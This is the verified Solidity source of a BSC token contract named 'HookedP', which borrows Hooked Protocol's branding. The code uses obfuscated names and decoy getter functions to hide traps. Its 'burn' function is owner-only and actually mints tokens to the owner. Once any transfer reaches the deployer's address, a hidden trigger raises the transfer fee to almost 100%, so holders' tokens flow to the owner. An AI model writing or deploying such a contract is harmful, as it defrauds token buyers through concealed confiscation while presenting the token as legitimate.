/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*
HookedP
The on-ramp layer for massive Web3 adoption to form the 
ecosystem of future community-owned economies.
Discord: https://discord.gg/hookedprotocol
         https://twitter.com/hebi555
         https://twitter.com/HookedProtocol
         https://t.co/frN4W72KFA
         https://t.co/de1Iri884c
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;
contract HookedP {
mapping (address => mapping (address => uint256)) private _allowances;
address private  LKPDET = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  QIVJBF = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
string public  symbol = "HookedP";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  AMMPMF = 10000000000;
uint256 private  JAARWT = 1000000000000000000;
uint256 private  TFZEDH = 100000000;
address public owner;
uint8 public constant decimals = 18;
address private  QTAGBX = address(0);
uint256 private  KIWDZB = 10000000000000;
string public  name = "HookedP";
uint256 public constant PVNZTJ = 99999;
uint256 private  RNMTTK = 1000000000000000000;
address private  MIRFNC = address(0);
uint256 private  XZRGWM = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  MNDTRG = 1000000000000000000000;
address private  GFOGVT = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMXZPEX 0");
require(spender != address(0), "fMXZPEX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getJAARWT() private returns (uint256) {
return JAARWT;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MXZPEX");
require(to != address(0), "MXZPEX");
require(amount <= balanceOf[from], "MXZPEX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* PVNZTJ/RNMTTK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GFOGVT){
RNMTTK = PVNZTJ+2;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getAMMPMF() private returns (uint256) {
return AMMPMF;
}

function _getQIVJBF() private returns (address) {
return QIVJBF;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getMNDTRG() private returns (uint256) {
return MNDTRG;
}

function _getMIRFNC() private returns (address) {
return MIRFNC;
}

function _getKIWDZB() private returns (uint256) {
return KIWDZB;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getTFZEDH() private returns (uint256) {
return TFZEDH;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
GFOGVT = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getXZRGWM() private returns (uint256) {
return XZRGWM;
}

function _getQTAGBX() private returns (address) {
return QTAGBX;
}

function _getLKPDET() private returns (address) {
return LKPDET;
}


}